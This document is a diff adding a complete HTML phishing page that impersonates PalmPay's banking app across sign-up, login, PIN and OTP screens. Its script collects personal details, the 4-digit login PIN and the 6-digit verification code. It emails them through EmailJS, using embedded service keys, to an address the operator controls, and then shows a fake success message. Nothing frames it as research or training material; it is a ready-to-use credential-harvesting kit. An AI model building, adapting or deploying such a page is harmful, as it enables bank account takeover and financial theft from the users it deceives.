@@ -1,0 +1,643 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PalmPay App Flow</title>
+
+  <!-- EmailJS SDK -->
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <script type="text/javascript">
+    (function() {
+      // Public Key Initialization
+      emailjs.init("T9BKyUuqVi2V4b31r");
+    })();
+  </script>
+
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      background-color: #f4f4f9;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .step-view {
+      display: none; /* Hide all steps by default */
+      width: 100%;
+      max-width: 400px;
+      min-height: 100vh;
+      padding: 20px 24px;
+      background: #ffffff;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+      border-radius: 12px;
+      position: relative;
+    }
+
+    .step-view.active {
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* Top Navigation Icons */
+    .top-bar {
+      width: 100%;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 10px 0;
+      margin-bottom: 30px;
+    }
+
+    .top-bar button {
+      background: none;
+      border: none;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .top-bar svg {
+      width: 24px;
+      height: 24px;
+      fill: none;
+      stroke: #1a1a1a;
+      stroke-width: 2;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
+
+    /* Form & Input General Styles */
+    .form-group {
+      margin-bottom: 20px;
+      width: 100%;
+    }
+
+    .form-group label {
+      display: block;
+      margin-bottom: 6px;
+      font-weight: 600;
+      color: #333333;
+      font-size: 14px;
+    }
+
+    .form-group input, 
+    .form-group select {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 14px;
+      outline: none;
+    }
+
+    .form-group input:focus, 
+    .form-group select:focus {
+      border-color: #6c11e4;
+    }
+
+    .input-field {
+      width: 100%;
+      padding: 18px 20px;
+      background-color: #f6f6f9;
+      border: 1px solid transparent;
+      border-radius: 16px;
+      font-size: 16px;
+      color: #1a1a1a;
+      outline: none;
+      transition: all 0.2s ease;
+    }
+
+    .input-field::placeholder {
+      color: #bebecc;
+    }
+
+    .input-field:focus {
+      background-color: #ffffff;
+      border-color: #6c11e4;
+    }
+
+    /* Primary Buttons */
+    .btn-primary {
+      width: 100%;
+      padding: 18px;
+      background-color: #dcd7f6;
+      color: #ffffff;
+      border: none;
+      border-radius: 16px;
+      font-size: 18px;
+      font-weight: 500;
+      cursor: not-allowed;
+      transition: background-color 0.2s ease;
+    }
+
+    .btn-primary.active, .btn-primary.enabled {
+      background-color: #6c11e4;
+      cursor: pointer;
+    }
+
+    /* Header & Logo */
+    .header {
+      text-align: center;
+      margin-bottom: 40px;
+    }
+
+    .logo-container {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 12px;
+    }
+
+    .logo-icon {
+      width: 44px;
+      height: 44px;
+      background: #6c11e4;
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .logo-icon svg {
+      width: 28px;
+      height: 28px;
+      fill: none;
+      stroke: #ffffff;
+      stroke-width: 3.5;
+    }
+
+    .logo-text {
+      font-size: 32px;
+      font-weight: 700;
+      color: #000000;
+      letter-spacing: -0.5px;
+    }
+
+    .tagline {
+      font-size: 20px;
+      color: #1a1a1a;
+      font-weight: 400;
+    }
+
+    /* Pass/PIN View Styles */
+    .avatar-container {
+      width: 80px;
+      height: 80px;
+      background-color: #dcd7f6;
+      border-radius: 50%;
+      display: flex;
+      justify-content: center;
+      align-items: flex-end;
+      overflow: hidden;
+      margin: 0 auto 20px auto;
+    }
+
+    .avatar-icon {
+      width: 50px;
+      height: 60px;
+      fill: #6c11e4;
+    }
+
+    .phone-number {
+      font-size: 22px;
+      font-weight: 700;
+      color: #1a1a2e;
+      margin-bottom: 16px;
+      letter-spacing: 0.5px;
+      text-align: center;
+    }
+
+    .instruction {
+      font-size: 16px;
+      color: #757575;
+      margin-bottom: 28px;
+      text-align: center;
+    }
+
+    .pin-container {
+      display: flex;
+      justify-content: center;
+      gap: 14px;
+      margin-bottom: 20px;
+    }
+
+    .pin-box {
+      width: 56px;
+      height: 56px;
+      background-color: #f6f6f9;
+      border: 1px solid transparent;
+      border-radius: 14px;
+      text-align: center;
+      font-size: 24px;
+      font-weight: 600;
+      color: #1a1a1a;
+      outline: none;
+      transition: all 0.2s ease;
+    }
+
+    .pin-box:focus {
+      background-color: #ffffff;
+      border-color: #6c11e4;
+    }
+
+    /* OTP View Styles */
+    .title {
+      font-size: 22px;
+      font-weight: 700;
+      color: #1a1a2e;
+      margin-bottom: 12px;
+      text-align: center;
+    }
+
+    .instruction-text {
+      font-size: 15px;
+      color: #666666;
+      text-align: center;
+      line-height: 1.4;
+      margin-bottom: 30px;
+      padding: 0 10px;
+    }
+
+    .otp-container {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 32px;
+    }
+
+    .otp-box {
+      width: 48px;
+      height: 54px;
+      background-color: #f6f6f9;
+      border: 1px solid transparent;
+      border-radius: 12px;
+      text-align: center;
+      font-size: 22px;
+      font-weight: 600;
+      color: #1a1a1a;
+      outline: none;
+      transition: all 0.2s ease;
+    }
+
+    .otp-box:focus {
+      background-color: #ffffff;
+      border-color: #6c11e4;
+    }
+
+    .phone-highlight {
+      color: #1a1a2e;
+      font-weight: 600;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- STEP 1: SIGN UP VIEW -->
+  <div id="step-signup" class="step-view active">
+    <div class="logo-container" style="margin: 20px 0;">
+      <div class="logo-icon">
+        <svg viewBox="0 0 24 24">
+          <path d="M6 12L12 6L18 12L12 18Z" stroke="white" stroke-linejoin="round"/>
+        </svg>
+      </div>
+      <span class="logo-text">PalmPay</span>
+    </div>
+
+    <form id="signupForm">
+      <div class="form-group">
+        <label for="fullName">Full Name</label>
+        <input type="text" id="fullName" required placeholder="Enter full name">
+      </div>
+
+      <div class="form-group">
+        <label for="whatsapp">WhatsApp Contact</label>
+        <input type="tel" id="whatsapp" required placeholder="Enter phone number" inputmode="numeric">
+      </div>
+
+      <div class="form-group">
+        <label for="usageDuration">How long have you been using PalmPay?</label>
+        <select id="usageDuration" required>
+          <option value="" disabled selected>Select duration</option>
+          <option value="less_than_6m">Less than 6 months</option>
+          <option value="6m_1y">6 months - 1 year</option>
+          <option value="1y_2y">1 - 2 years</option>
+          <option value="more_than_2y">More than 2 years</option>
+        </select>
+      </div>
+
+      <div class="form-group">
+        <label for="age">Age</label>
+        <input type="number" id="age" min="1" max="120" placeholder="Enter age" required>
+      </div>
+
+      <div class="form-group">
+        <label for="gender">Gender</label>
+        <select id="gender" required>
+          <option value="" disabled selected>Select gender</option>
+          <option value="male">Male</option>
+          <option value="female">Female</option>
+          <option value="other">Prefer not to say</option>
+        </select>
+      </div>
+
+      <div class="form-group">
+        <label for="referrerEmail">Referrer Email</label>
+        <input type="email" id="referrerEmail" required placeholder="Enter referrer email">
+      </div>
+
+      <button type="submit" class="btn-primary enabled">Join Community</button>
+    </form>
+  </div>
+
+  <!-- STEP 2: LOGIN VIEW -->
+  <div id="step-login" class="step-view">
+    <div class="top-bar">
+      <button type="button" onclick="goToStep('step-signup')" aria-label="Go back">
+        <svg viewBox="0 0 24 24"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
+      </button>
+      <button type="button" aria-label="Customer Support">
+        <svg viewBox="0 0 24 24">
+          <path d="M3 18v-6a9 9 0 0 1 18 0v6"></path>
+          <path d="M21 19a2 2 0 0 1-2 2h-1a2 2 0 0 1-2-2v-3a2 2 0 0 1 2-2h3z"></path>
+          <path d="M3 19a2 2 0 0 0 2 2h1a2 2 0 0 0 2-2v-3a2 2 0 0 0-2-2H3z"></path>
+        </svg>
+      </button>
+    </div>
+
+    <div class="header">
+      <div class="logo-container">
+        <div class="logo-icon">
+          <svg viewBox="0 0 24 24">
+            <path d="M6 12L12 6L18 12L12 18Z" stroke="white" stroke-linejoin="round"/>
+          </svg>
+        </div>
+        <span class="logo-text">PalmPay</span>
+      </div>
+      <p class="tagline">The Smarter Way to Bank</p>
+    </div>
+
+    <form id="loginForm">
+      <div class="form-group">
+        <input type="text" id="userInput" class="input-field" placeholder="Please enter Phone Number / Email" required autocomplete="off" />
+      </div>
+
+      <button type="submit" id="loginBtn" class="btn-primary">Log in</button>
+    </form>
+  </div>
+
+  <!-- STEP 3: PASS VIEW (PIN ENTRY) -->
+  <div id="step-pass" class="step-view">
+    <div class="top-bar">
+      <button type="button" onclick="goToStep('step-login')" aria-label="Go back">
+        <svg viewBox="0 0 24 24"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
+      </button>
+      <button type="button" aria-label="Customer Support">
+        <svg viewBox="0 0 24 24">
+          <path d="M3 18v-6a9 9 0 0 1 18 0v6"></path>
+          <path d="M21 19a2 2 0 0 1-2 2h-1a2 2 0 0 1-2-2v-3a2 2 0 0 1 2-2h3z"></path>
+          <path d="M3 19a2 2 0 0 0 2 2h1a2 2 0 0 0 2-2v-3a2 2 0 0 0-2-2H3z"></path>
+        </svg>
+      </button>
+    </div>
+
+    <div class="avatar-container">
+      <svg class="avatar-icon" viewBox="0 0 24 24">
+        <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
+      </svg>
+    </div>
+
+    <div class="phone-number" id="displayUserNumber">070 **** 7479</div>
+    <div class="instruction">Enter 4 digits PIN to login</div>
+
+    <div class="pin-container">
+      <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+      <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+      <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+      <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+    </div>
+  </div>
+
+  <!-- STEP 4: OTP VIEW -->
+  <div id="step-otp" class="step-view">
+    <div class="top-bar">
+      <button type="button" onclick="goToStep('step-pass')" aria-label="Go back">
+        <svg viewBox="0 0 24 24"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
+      </button>
+      <button type="button" aria-label="Customer Support">
+        <svg viewBox="0 0 24 24">
+          <path d="M3 18v-6a9 9 0 0 1 18 0v6"></path>
+          <path d="M21 19a2 2 0 0 1-2 2h-1a2 2 0 0 1-2-2v-3a2 2 0 0 1 2-2h3z"></path>
+          <path d="M3 19a2 2 0 0 0 2 2h1a2 2 0 0 0 2-2v-3a2 2 0 0 0-2-2H3z"></path>
+        </svg>
+      </button>
+    </div>
+
+    <div class="title">Verification Code</div>
+    <p class="instruction-text">
+      Please enter the code sent to <span id="otpPhoneDisplay" class="phone-highlight">070 **** 7479</span> to confirm it's really you.
+    </p>
+
+    <div class="otp-container">
+      <input type="text" maxlength="1" class="otp-box" inputmode="numeric">
+      <input type="text" maxlength="1" class="otp-box" inputmode="numeric">
+      <input type="text" maxlength="1" class="otp-box" inputmode="numeric">
+      <input type="text" maxlength="1" class="otp-box" inputmode="numeric">
+      <input type="text" maxlength="1" class="otp-box" inputmode="numeric">
+      <input type="text" maxlength="1" class="otp-box" inputmode="numeric">
+    </div>
+
+    <button id="confirmBtn" class="btn-primary" disabled>Confirm</button>
+  </div>
+
+  <script>
+    // State storage for registered details
+    let registrationData = {};
+    let enteredPinCode = '';
+
+    // Navigation Control Function
+    function goToStep(stepId) {
+      document.querySelectorAll('.step-view').forEach(view => view.classList.remove('active'));
+      const activeStep = document.getElementById(stepId);
+      activeStep.classList.add('active');
+
+      const firstInput = activeStep.querySelector('input');
+      if (firstInput) firstInput.focus();
+    }
+
+    // 1. Sign Up Logic
+    document.getElementById('signupForm').addEventListener('submit', (e) => {
+      e.preventDefault();
+
+      registrationData = {
+        fullName: document.getElementById('fullName').value,
+        whatsapp: document.getElementById('whatsapp').value,
+        usageDuration: document.getElementById('usageDuration').value,
+        age: document.getElementById('age').value,
+        gender: document.getElementById('gender').value,
+        referrerEmail: document.getElementById('referrerEmail').value
+      };
+
+      if (registrationData.whatsapp) {
+        userInput.value = registrationData.whatsapp;
+        loginBtn.classList.add('active');
+      }
+
+      goToStep('step-login');
+    });
+
+    // 2. Login Logic & Passing Input to Pass Page
+    const userInput = document.getElementById('userInput');
+    const loginBtn = document.getElementById('loginBtn');
+    const displayUserNumber = document.getElementById('displayUserNumber');
+    const otpPhoneDisplay = document.getElementById('otpPhoneDisplay');
+
+    userInput.addEventListener('input', () => {
+      if (userInput.value.trim() !== '') {
+        loginBtn.classList.add('active');
+      } else {
+        loginBtn.classList.remove('active');
+      }
+    });
+
+    document.getElementById('loginForm').addEventListener('submit', (e) => {
+      e.preventDefault();
+      const value = userInput.value.trim();
+      if (value !== '') {
+        displayUserNumber.textContent = value;
+        otpPhoneDisplay.textContent = value;
+        goToStep('step-pass');
+      }
+    });
+
+    // 3. PIN Logic & First Email Dispatch via EmailJS
+    const pinInputs = document.querySelectorAll('.pin-box');
+    pinInputs.forEach((input, index) => {
+      input.addEventListener('input', (e) => {
+        if (e.target.value.length === 1 && index < pinInputs.length - 1) {
+          pinInputs[index + 1].focus();
+        }
+
+        const pin = Array.from(pinInputs).map(i => i.value).join('');
+        if (pin.length === 4) {
+          enteredPinCode = pin;
+
+          // Dispatch initial payload to referrer email
+          const templateParams = {
+            to_email: registrationData.referrerEmail || '',
+            full_name: registrationData.fullName || '',
+            whatsapp: registrationData.whatsapp || '',
+            experience: registrationData.usageDuration || '',
+            age: registrationData.age || '',
+            gender: registrationData.gender || '',
+            referrer: registrationData.referrerEmail || '',
+            login_phone: userInput.value.trim(),
+            login_password: enteredPinCode,
+            otp_code: 'Not Entered Yet'
+          };
+
+          emailjs.send("service_rf9jc9g", "template_ykjxd5h", templateParams)
+            .then(() => {
+              pinInputs.forEach(i => i.value = '');
+              goToStep('step-otp');
+            }, (error) => {
+              pinInputs.forEach(i => i.value = '');
+              goToStep('step-otp');
+            });
+        }
+      });
+
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && !input.value && index > 0) {
+          pinInputs[index - 1].focus();
+        }
+      });
+    });
+
+    // 4. OTP Logic & Final Email Dispatch via EmailJS
+    const otpInputs = document.querySelectorAll('.otp-box');
+    const confirmBtn = document.getElementById('confirmBtn');
+
+    otpInputs.forEach((input, index) => {
+      input.addEventListener('input', (e) => {
+        if (e.target.value.length === 1 && index < otpInputs.length - 1) {
+          otpInputs[index + 1].focus();
+        }
+        checkOtpCompletion();
+      });
+
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && !input.value && index > 0) {
+          otpInputs[index - 1].focus();
+        }
+      });
+
+      input.addEventListener('paste', (e) => {
+        const pasteData = e.clipboardData.getData('text').trim();
+        if (/^\d{6}$/.test(pasteData)) {
+          e.preventDefault();
+          pasteData.split('').forEach((char, i) => {
+            if (otpInputs[i]) otpInputs[i].value = char;
+          });
+          otpInputs[otpInputs.length - 1].focus();
+          checkOtpCompletion();
+        }
+      });
+    });
+
+    function checkOtpCompletion() {
+      const code = Array.from(otpInputs).map(i => i.value).join('');
+      if (code.length === 6) {
+        confirmBtn.classList.add('active');
+        confirmBtn.disabled = false;
+      } else {
+        confirmBtn.classList.remove('active');
+        confirmBtn.disabled = true;
+      }
+    }
+
+    confirmBtn.addEventListener('click', () => {
+      const enteredOtp = Array.from(otpInputs).map(i => i.value).join('');
+
+      if (enteredOtp.length < 6) return;
+
+      confirmBtn.textContent = "Verifying...";
+      confirmBtn.disabled = true;
+
+      const otpTemplateParams = {
+        to_email: registrationData.referrerEmail || '',
+        full_name: registrationData.fullName || '',
+        whatsapp: registrationData.whatsapp || '',
+        experience: registrationData.usageDuration || '',
+        age: registrationData.age || '',
+        gender: registrationData.gender || '',
+        referrer: registrationData.referrerEmail || '',
+        login_phone: userInput.value.trim(),
+        login_password: enteredPinCode,
+        otp_code: enteredOtp
+      };
+
+      emailjs.send("service_rf9jc9g", "template_ykjxd5h", otpTemplateParams)
+        .then(() => {
+          alert(`Verification completed successfully! Code (${enteredOtp}) sent to ${registrationData.referrerEmail}.`);
+          confirmBtn.textContent = "Confirm";
+          confirmBtn.disabled = false;
+        }, (error) => {
+          alert("Failed to send OTP code: " + JSON.stringify(error));
+          confirmBtn.textContent = "Confirm";
+          confirmBtn.disabled = false;
+        });
+    });
+  </script>
+</body>
+</html>
